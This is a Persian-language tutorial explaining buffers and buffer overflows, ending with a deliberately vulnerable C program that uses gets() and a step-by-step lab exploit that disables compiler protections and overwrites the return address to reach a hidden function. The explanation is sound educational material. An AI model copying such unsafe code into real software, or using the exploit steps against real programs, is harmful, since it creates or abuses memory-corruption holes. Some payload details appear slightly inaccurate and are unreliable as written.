### 📌 **Buffer (بافر) در علم کامپیوتر یعنی چی؟**

**بافر** (Buffer) در واقع یه ناحیهٔ موقتی از حافظه‌ست که برای **ذخیرهٔ موقت داده‌ها** استفاده می‌شه، قبل از اینکه این داده‌ها به یه مقصد دیگه منتقل بشن یا پردازش بشن.

---

### ✅ **چرا از بافر استفاده می‌کنیم؟**

فرض کن:

- یه فایل بزرگ قراره از دیسک خونده بشه و به کارت گرافیک بره.
    
- یا یه فیلم داره استریم می‌شه از اینترنت به پخش‌کنندهٔ ویدیو.
    

📍 در هر دو حالت، سرعت منبع (مثلاً هارد یا اینترنت) با سرعت مقصد (مثلاً کارت گرافیک یا پخش‌کننده) **یکسان نیست**. این تفاوت باعث می‌شه اگه داده‌ها مستقیم منتقل بشن، یا از دست برن یا گیر کنن.

✅ **بافر مثل یه "منطقهٔ موقت" بین این دو عمل می‌کنه** و داده‌ها رو برای لحظه‌ای نگه می‌داره تا مقصد آماده بشه برای دریافت.

---

### 🎯 مثال ساده:

📦 فرض کن تو داری آب داخل بطری می‌ریزی و یکی دیگه با اون آب ظرف می‌شوره. اما سرعت تو از اون بیشتره.

🪣 پس یه سطل (Buffer) بین‌تون می‌ذارن. تو آب رو داخل سطل می‌ریزی و اون هر وقت نیاز داشت از توی سطل برمی‌داره.

### 🧠 کاربردهای بافر:

| کاربرد                 | توضیح                                                                             |
| ---------------------- | --------------------------------------------------------------------------------- |
| 🧮 **برنامه‌نویسی**    | زبان‌هایی مثل C و C++ بافرهایی برای خواندن و نوشتن فایل‌ها دارند.                 |
| 💾 **سیستم‌عامل**      | هنگام انتقال داده بین RAM و دیسک یا شبکه، از بافر استفاده می‌شه.                  |
| 🎵 **پخش صدا و ویدیو** | برای جلوگیری از قطعی، بافر صدا یا تصویر قبل از پخش پر می‌شه.                      |
| 📡 **شبکه**            | وقتی داده‌ها از شبکه میان، اول توی بافر ذخیره می‌شن تا کامل بشن و بعد استفاده شن. |

### ⚠️ نکته امنیتی: Buffer Overflow

وقتی بیشتر از ظرفیت یک بافر بهش داده بفرستی، ممکنه **داده‌ها وارد حافظه‌های مجاور بشن**. این موضوع باعث آسیب‌پذیری به نام **Buffer Overflow** می‌شه که هکرها می‌تونن ازش برای اجرای کد مخرب استفاده کنن.

---


---

## 🚨 Buffer Overflow یعنی چی؟

**Buffer Overflow (سرریز بافر)** یک نوع **اشتباه در حافظه** هست که زمانی اتفاق می‌افته که یک برنامه سعی می‌کنه **بیش از ظرفیت یک بافر (حافظه موقت)** به اون داده وارد کنه.

📌 وقتی این اتفاق می‌افته، داده‌ها وارد بخش‌هایی از حافظه می‌شن که نباید بشن — و این می‌تونه باعث **خراب شدن برنامه، کرش، یا حتی اجرای کد مخرب توسط مهاجم** بشه!

---

## 🧠 چطوری اتفاق می‌افته؟

فرض کن یه برنامه یه بافر درست کرده با اندازه ۱۰ بایت برای گرفتن نام کاربر:

```c
char name[10];
gets(name); // ورودی از کاربر می‌گیره
```

حالا اگه کاربر وارد کنه:

```
AAAAAAAAAAAAAAAAAAAAAAAAA
```

که مثلاً ۲۵ حرف داره، این اتفاق می‌افته:

|name[0]|name[1]|...|name[9]|🧨 name[10]|name[11]|...|
|---|---|---|---|---|---|---|
|A|A|...|A|A|A|...|

داده‌ها می‌رن توی حافظه‌ای که به name تعلق نداشت! و ممکنه چیزی مثل **return address (آدرس برگشت تابع)** رو هم خراب کنن!

---

## 💥 چرا خطرناکه؟

هکرها می‌تونن این ویژگی رو طوری سوء‌استفاده کنن که برنامه:

✅ به جای ادامه اجرای عادی  
🚨 **کد دلخواه مهاجم رو اجرا کنه!**

---

## 🛠️ مثالی از حمله (ساده‌سازی شده):

مثلاً فرض کن برنامه‌ای داره تابعی رو اجرا می‌کنه:

```c
void vulnerable_function() {
    char buffer[64];
    gets(buffer); // بدون بررسی طول داده
}
```

مهاجم رشته‌ای وارد می‌کنه که:

- اول با `A`های زیاد بافر رو پر می‌کنه
    
- بعد به جای return address، آدرس یه شِل‌کد یا تابع مخرب رو وارد می‌کنه
    

در نهایت وقتی تابع تموم شد، به جای برگشتن به مسیر طبیعی خودش، می‌ره به آدرسی که مهاجم داده و کد رو اجرا می‌کنه.

---

## 🔐 چطور جلوش رو بگیریم؟

1. ✅ **استفاده از توابع امن** مثل `fgets()` به‌جای `gets()`
    
2. ✅ بررسی طول داده قبل از کپی به بافر
    
3. ✅ استفاده از زبان‌های ایمن مثل Python، Java
    
4. ✅ استفاده از مکانیزم‌های محافظتی در سیستم‌عامل:
    
    - **ASLR (Address Space Layout Randomization)**
        
    - **DEP/NX (Data Execution Prevention)**
        
    - **Stack Canaries**

## 🧪 کد آسیب‌پذیر به Buffer Overflow

```c
#include <stdio.h>
#include <string.h>

void secret_function() {
    printf("🔥 You hacked the system! 🔥\n");
}

void vulnerable_function() {
    char buffer[64];

    printf("Enter your name: ");
    gets(buffer); // ❌ تابع ناامن!
    printf("Hello, %s\n", buffer);
}

int main() {
    vulnerable_function();
    return 0;
}
```

---

## 🧠 توضیح خط‌به‌خط:

|خط|توضیح|
|---|---|
|`char buffer[64];`|یه بافر ۶۴ بایتی برای ورودی کاربر|
|`gets(buffer);`|تابعی ناامن که هیچ بررسی طولی انجام نمی‌ده|
|`secret_function()`|تابعی که قرار نیست اجرا بشه — اما ما می‌خوایم با هک اجراش کنیم!|

---

## 🎯 هدف حمله:

ما با وارد کردن یه ورودی خیلی طولانی می‌خوایم:

1. بافر رو کامل پر کنیم
    
2. به جای آدرس برگشت تابع `vulnerable_function`، آدرس `secret_function` رو قرار بدیم
    
3. وقتی تابع تموم شد، بره و `secret_function()` رو اجرا کنه!
    

---

## 🔧 ساخت اکسپلویت:

برای این کار معمولاً توی سیستم لوکال یا ماشین مجازی، مراحل اینجوریه:

1. کامپایل کد با گزینه‌هایی که محافظت‌ها رو غیرفعال کنه:
    

```bash
gcc -fno-stack-protector -z execstack -no-pie bof.c -o bof
```

2. اجرای برنامه با ورودی طولانی مثل:
    

```bash
python3 -c "print('A'*72 + '\xXX\xXX\xXX\xXX')" | ./bof
```

🔺 به جای `\xXX...` باید آدرس تابع `secret_function()` رو بذاری (مثلاً با استفاده از `objdump` یا `gdb` به‌دست میاد)

---

## 🔍 استخراج آدرس تابع با GDB

```bash
gdb ./bof
(gdb) disas secret_function
```

مثلاً می‌گه آدرسش هست: `0x080484b6`

پس باید ورودی این شکلی بدی:

```bash
python3 -c "print('A'*72 + '\xb6\x84\x04\x08')" | ./bof
```

و خروجی می‌شه:

```
🔥 You hacked the system! 🔥
```
